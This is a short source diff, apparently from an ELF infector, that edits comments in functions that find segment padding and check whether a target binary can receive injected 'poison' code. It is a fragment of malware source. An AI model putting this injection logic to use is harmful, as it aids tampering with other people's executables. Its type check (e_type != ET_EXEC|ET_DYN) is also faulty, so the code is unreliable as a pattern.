@@ -74,8 +74,6 @@ void load_poison_binary_in_memory(char *poison_binary){
 
 
 int get_padding_size(Elf64_Ehdr* target_binary_header){
-    // return the padding size between the text segment and data segment
-
     Elf64_Phdr* target_binary_program_header = (Elf64_Phdr*)(target_memory_address + target_binary_header->e_phoff);
     Elf64_Half program_headers_num = target_binary_header->e_phnum;
     int FOUND = 0;
@@ -138,15 +136,17 @@ void inject_poison(char* injected_address){
 }
 
 int sanity_checks(Elf64_Ehdr* target_binary_header, char *target_binary){
-    // 1) verify if it is an elf file
+    // 1) check if it is an elf file
     if (target_binary_header->e_type == ET_NONE){
         fprintf(stdout, AC_RED "[-] '%s' is not an elf file, poison was not injected\n" AC_NORMAL, target_binary);
         return -1;
     }
+    // 2) check if elf is of type exec|dyn
     if (target_binary_header->e_type != (ET_EXEC|ET_DYN)){
         fprintf(stdout, AC_RED "[-] '%s' is not an elf of type DYN or EXEC, poison was not injected\n" AC_NORMAL, target_binary);
         return -1;
     }
+    // 3) check if compiled target binary architecture is x86_64
     if (target_binary_header->e_machine != EM_X86_64){
         fprintf(stdout, AC_RED "[-] architecture is not supprted, poison was not injected\n" AC_NORMAL);
         return -1;
